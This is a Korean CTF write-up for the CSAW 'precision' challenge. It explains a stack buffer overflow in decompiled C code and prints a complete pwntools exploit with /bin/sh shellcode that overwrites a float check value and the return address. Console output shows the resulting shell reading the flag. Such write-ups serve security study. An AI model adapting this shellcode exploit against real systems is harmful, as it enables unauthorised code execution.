============================================================================================================
[csaw] precision
============================================================================================================


Source Analysis
============================================================================================================

프로그램은 스택 카나리와 nx는 안걸려 있고 aslr만 걸려 있는데 문제에서 버퍼 위치를 찍어 줍니다. 

.. code-block:: c

    int __cdecl main(int argc, const char **argv, const char **envp)
    {
        int v4; // [sp+18h] [bp-88h]@1
        double v5; // [sp+98h] [bp-8h]@1

        v5 = 64.33333;
        setvbuf(stdout, 0, 2, 0);
        printf("Buff: %p\n", &v4);
        __isoc99_scanf("%s", &v4);
        if ( 64.33333 != v5 )
        {
            puts("Nope");
            exit(1);
        }
        return printf(str, &v4);
    }

그리고 문제를 보면 v4에서 간단한 오버플로우가 발생되며 중간에 v5값만 맞춰서 넣어 주는것만 조심하면 쉽게 해결 됩니다.

|

공격 코드는 다음과 같습니다.

.. code-block:: python

    from pwn import *
    import struct

    p = lambda x: struct.pack("<I", x)

    sh = process("./precision")

    # Buff: 0xffe6c0d8
    recv = sh.recvline()
    buf_addr = int(recv.split(" ")[1][2:], 16)
    print "%d [%s]" % (buf_addr, hex(buf_addr))

    # Attack Payload
    # Shellcode + Dummy + p32(0x475a31a5)+ p32(40501555) + Dummy (12) + buf_addr

    shellcode= "\x31\xc0\xb0\x30\x01\xc4\x30\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\xb0\xc0\xe8\x04\xcd\x80\xc0\xe8\x03\xcd\x80"
    precision = "\xa5\x31\x5a\x47\x55\x15\x50\x40"

    payload = shellcode + "A" * (128-len(shellcode)) + precision + "B" * 12 + p(buf_addr)

    sh.sendline(payload)
    sh.interactive() 


공격 코드 = 쉘 코드 + v5 이전까지의 더미 + v5에 해당 하는 8바이트 + eip 전까지 12바이트 더미 + 문제에서 찍어주는 buf 주소

.. code-block:: console

    $ python exploit.py 

    [+] Started program './precision'
    4294231000 [0xfff4c3d8]
    [*] Switching to interactive mode

    Got 1��0 �0�Ph//shh/bin\x89���\xb0\xb0��\x04̀��\x03̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa51ZGU\x15P@BBBBBBBBBBBB����
                    ls
    contacts
    contacts_1153cd2daa128685d40c020c439fa906
    dump
    exploit.py
    flag
    precision
    precision_a8f6f0590c177948fe06c76a1831e650

    $ cat flag
    THE FLAG IS {this is flag}

    $ exit